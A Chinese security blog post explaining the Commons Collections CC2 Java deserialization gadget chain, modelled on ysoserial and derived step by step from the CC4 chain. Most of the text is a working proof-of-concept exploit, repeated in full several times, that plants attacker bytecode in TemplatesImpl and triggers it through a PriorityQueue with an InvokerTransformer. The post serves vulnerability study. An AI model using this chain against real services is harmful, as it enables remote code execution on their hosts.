---
title: JAVA安全:CC2链
---

*作者：Narcher*	*时间：2024/3/19*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

CC2这条链和CC4很像，只是改变了原先的ChainedTransformer的地方。CC2作为CC链中唯一不用数组的链子，其作用听白日梦组长说是为了防止某些中间件重写类加载的流程，导致数组可能会加载不到。同时，CC1链在jdk8u71以上的版本因为AnnotationInvocationHandler类的readObject方法被修复了



## 正文

emmm...

我们还是先看一下ysoserial中的CC2流程：

<img src="JAVA%E5%AE%89%E5%85%A8CC2%E9%93%BE/1710849838700.png" alt="1710849838700" style="zoom:67%;" />

基本上是和CC4是一样的，我们只需要更改ChainedTransformer就好了：

### 1.InvokerTransformer部分

先把CC4贴出来：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
priorityQueue.add(1);
priorityQueue.add(2);
Class c = transformingComparator.getClass();
Field transformerField = c.getDeclaredField("transformer");
transformerField.setAccessible(true);
transformerField.set(transformingComparator, chainedTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
oos.writeObject(priorityQueue);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
ois.readObject();
```

将CC4中的：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
```

改成：

```java
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
```

相当于绕过了TrAXFilter和InstantiateTransformer，将其替换成了InvokerTransformer，进一步地沟通了TransformingComparator和

TemplatesImpl

### 2.传入templates

目前我们的链子是这样的：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
priorityQueue.add(1);
priorityQueue.add(2);
Class c = transformingComparator.getClass();
Field transformerField = c.getDeclaredField("transformer");
transformerField.setAccessible(true);
transformerField.set(transformingComparator, invokerTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
oos.writeObject(priorityQueue);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
ois.readObject();
```

因为ChainedTransformer被替换掉了，其中的ConstantTransformer自然也是没了，我们就需要传参了，先运行一下看看哪里报错，我们进去调试查看需要传参的地方即可：

<img src="JAVA%E5%AE%89%E5%85%A8CC2%E9%93%BE/1710850471999.png" alt="1710850471999" style="zoom:67%;" />

报错整数类型的对象没有newTransformer方法，再看看我们的链子，是不是突然明白该改哪里了呢？

我们将add的内容改为templates即可：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
priorityQueue.add(templates);
priorityQueue.add(templates);
Class c = transformingComparator.getClass();
Field transformerField = c.getDeclaredField("transformer");
transformerField.setAccessible(true);
transformerField.set(transformingComparator, invokerTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
oos.writeObject(priorityQueue);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
ois.readObject();
```

CC2就这样完成了